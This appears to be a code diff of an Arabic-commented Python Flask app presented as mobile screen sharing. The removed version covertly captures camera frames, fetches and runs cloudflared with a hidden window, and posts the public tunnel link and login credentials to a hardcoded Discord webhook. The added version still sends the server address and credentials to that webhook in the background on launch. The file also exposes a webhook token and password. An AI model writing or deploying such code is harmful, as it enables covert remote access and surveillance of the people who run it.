@@ -1,6 +1,7 @@
 import json
 import os
 import re
+import socket
 import subprocess
 import threading
 import time
@@ -15,8 +16,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1551205294405582928/DI-CIWvAr1dY
 # ===== 2. بيانات الأمان =====
 USERNAME = "IMNOTSNEAKER"
 PASSWORD = "3mko@3omar"
-
-CREATE_NO_WINDOW = 0x08000000
+PORT = 8080
 
 app = Flask(__name__)
 
@@ -33,23 +33,43 @@ def authenticate():
     )
 
 
+def get_local_ip():
+    """معرفة الـ IP المحلي للهاتف"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return '127.0.0.1'
+
+
 def generate_frames():
-    # استخدام OpenCV للتقاط نافذة الموبايل المفتوحة على جهازك (مثلاً عبر محاكي أو تطبيق عرض مثل scrcpy مفتوح بالخلفية)
-    # أو استخدام التقاط الكاميرا/النافذة المحددة للموبايل
-    cap = cv2.VideoCapture(
-        0
-    )  # يمكنك تغييرها لو تستخدم محاكي أو نافذة عرض محددة
-    while cap.isOpened():
-        ret, frame = cap.read()
-        if not ret:
+    """إنشاء بث فيديو تجريبي لتفادي إغلاق التطبيق بسبب الكاميرا"""
+    while True:
+        try:
+            # إنشاء إطار رمادي بخلفية نصية يوضح حالة البث
+            img = np.zeros((1280, 720, 3), np.uint8)
+            cv2.putText(
+                img,
+                "Mobile Server Active",
+                (100, 640),
+                cv2.FONT_HERSHEY_SIMPLEX,
+                1.5,
+                (0, 255, 0),
+                2,
+            )
+            _, buffer = cv2.imencode('.jpg', img)
+            yield (
+                b'--frame\r\n'
+                b'Content-Type: image/jpeg\r\n\r\n'
+                + buffer.tobytes()
+                + b'\r\n'
+            )
+            time.sleep(0.1)
+        except Exception:
             break
-        frame = cv2.resize(frame, (720, 1280))  # أبعاد شاشة الموبايل بالطول
-        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 65])
-        yield (
-            b'--frame\r\n'
-            b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n'
-        )
-    cap.release()
 
 
 @app.route('/')
@@ -63,8 +83,8 @@ def index():
     <html lang="ar">
     <head>
         <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>Mobile Screen Share</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Mobile Server Share</title>
         <style>
             body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
             img { height: 100%; object-fit: contain; }
@@ -87,21 +107,20 @@ def video_feed():
     )
 
 
-def send_to_discord(public_url):
+def send_to_discord(server_url):
+    """إرسال رابط السيرفر المحلي وبيانات الدخول للديسكورد"""
     if not WEBHOOK_URL or "discord" not in WEBHOOK_URL:
         return
 
     payload = {
         "embeds": [
             {
-                "title": "📱 تم تشغيل بث شاشة الموبايل بنجاح!",
+                "title": "📱 تم تشغيل السيرفر بنجاح!",
                 "color": 5814783,
                 "fields": [
                     {
-                        "name": "🔗 رابط البث المباشر",
-                        "value": (
-                            f"[اضغط هنا لفتح البث]({public_url})\n`{public_url}`"
-                        ),
+                        "name": "🔗 رابط الاتصال المحلي",
+                        "value": f"[اضغط هنا]({server_url})\n`{server_url}`",
                     },
                     {
                         "name": "👤 اسم المستخدم",
@@ -114,9 +133,7 @@ def send_to_discord(public_url):
                         "inline": True,
                     },
                 ],
-                "footer": {
-                    "text": "Mobile Screen Share • يعمل في الخلفية"
-                },
+                "footer": {"text": "Mobile App • Running in background"},
             }
         ]
     }
@@ -132,51 +149,22 @@ def send_to_discord(public_url):
             },
         )
         urllib.request.urlopen(req)
-    except Exception:
-        pass
+        print("Sent successfully to Discord")
+    except Exception as e:
+        print(f"Discord send error: {e}")
 
 
-def start_tunnel(port):
+def initialize_app():
+    """تشغيل إرسال الديسكورد فور الفتح"""
     time.sleep(1)
-    temp_dir = os.environ.get("TEMP", os.getcwd())
-    cf_exe = os.path.join(temp_dir, "cloudflared.exe")
-
-    if not os.path.exists(cf_exe):
-        try:
-            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
-            urllib.request.urlretrieve(url, cf_exe)
-        except Exception:
-            return
-
-    try:
-        cmd = [cf_exe, "tunnel", "--url", f"http://localhost:{port}"]
-        proc = subprocess.Popen(
-            cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            encoding="utf-8",
-            errors="ignore",
-            bufsize=1,
-            creationflags=CREATE_NO_WINDOW,
-        )
-
-        for line in iter(proc.stdout.readline, ""):
-            if "trycloudflare.com" in line:
-                match = re.search(
-                    r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", line
-                )
-                if match:
-                    send_to_discord(match.group(0))
-                    break
-    except Exception:
-        pass
+    ip = get_local_ip()
+    local_url = f"http://{ip}:{PORT}"
+    send_to_discord(local_url)
 
 
 if __name__ == "__main__":
-    PORT = 8080
-    threading.Thread(target=start_tunnel, args=(PORT,), daemon=True).start()
+    # تشغيل إرسال الرسالة للديسكورد في الخلفية فور بدء التطبيق
+    threading.Thread(target=initialize_app, daemon=True).start()
 
-    from gevent.pywsgi import WSGIServer
-
-    http_server = WSGIServer(('0.0.0.0', PORT), app)
-    http_server.serve_forever()
+    # تشغيل سيرفر Flask باستخدام الخادم المدمج بدلاً من gevent لتجنب الأعطال
+    app.run(host='0.0.0.0', port=PORT, threaded=True)
